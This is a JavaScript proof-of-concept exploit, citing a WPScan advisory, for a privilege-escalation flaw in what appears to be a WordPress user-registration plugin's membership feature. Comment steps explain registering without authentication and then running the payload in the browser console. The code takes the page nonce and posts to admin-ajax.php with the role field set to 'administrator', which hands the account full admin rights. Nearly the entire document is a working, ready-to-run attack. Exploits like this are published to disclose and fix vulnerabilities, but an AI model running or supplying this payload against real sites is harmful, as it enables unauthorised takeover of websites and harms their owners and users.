// Source: https://wpscan.com/vulnerability/2c0f62a1-9510-4f90-a297-17634e6c8b75/
// 1. As unauthenticated, register new user at /membership-registration/
// 2. As unauthenticated, visit /membership-pricing/ and execute JS payload below via browser console, 
// Replace user in payload
// 3. Upon logging into the registered account, notice that you have `administrator` permissions.  

async function payload(username, role) {

    const membership_id =  document.querySelector("input.ur_membership_input_class.ur_membership_radio_input").value;
    
    const security = ur_membership_frontend_localized_data._nonce;
    
    const formData = new FormData();
    formData.append("action", "user_registration_membership_register_member");
    formData.append("members_data", JSON.stringify({"membership":membership_id,"total":"0","payment_method":"free","start_date":"2025-3-18","username":username,"role":role}));
    formData.append("form_response", JSON.stringify({"username":username,"success_message_positon":"1","form_login_option":"0","redirect_timeout":2000,"registration_type":"membership"}));
    formData.append("_wpnonce", security);

    try {
        const response = await fetch("/wp-admin/admin-ajax.php", {
            method: "POST",
            body: formData
        });

        if (!response.ok) {
            console.error(`Erro na requisição: ${response.status} - ${response.statusText}`);
        } else {
            const result = await response.text();
            console.log("Resposta recebida:", result);
        }
    } catch (error) {
        console.error("Erro ao enviar a requisição:", error);
    }
}

// Set your registred user
payload("set-user", "administrator")